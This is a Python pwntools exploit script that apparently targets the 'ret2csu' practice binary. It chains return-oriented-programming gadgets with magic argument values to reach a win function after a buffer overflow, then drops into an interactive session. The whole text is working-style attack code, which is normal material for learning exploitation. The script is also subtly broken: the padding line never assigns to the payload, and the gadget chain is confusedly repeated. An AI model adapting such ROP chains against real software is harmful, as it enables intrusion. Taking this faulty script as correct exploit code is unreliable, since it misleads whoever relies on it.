from pwn import *

#, b * 0x4006a1

target = process("./ret2csu")

ret2csu = p64(0x400647) # has  mov    %rdx,%r15
pop_rdi = p64(0x00000000004006a3)# : pop rdi ; ret
pop_rsi_r15 = p64(0x00000000004006a1)# : pop rsi ; pop r15 ; ret
deadbeef = p64(0xdeadbeefdeadbeef)
cafebabe = p64(0xcafebabecafebabe)
d00df00d = p64(0xd00df00dd00df00d)
ret2win = p64(0x0040062a)
ret = p64(0x00000000004004e6)# : ret

payload = b""
payload + b"A" * 56

payload += pop_rsi_r15
payload += cafebabe
payload += d00df00d
payload += ret
payload += ret2csu

payload += pop_rsi_r15
payload += cafebabe
payload += d00df00d
payload += ret
payload += ret2csu

payload += pop_rdi 
payload += deadbeef

payload += pop_rsi_r15
payload += cafebabe
payload += p64(0x8)

payload += pop_rdi 
payload += deadbeef
payload += ret2win

target.sendline(payload)

target.interactive()

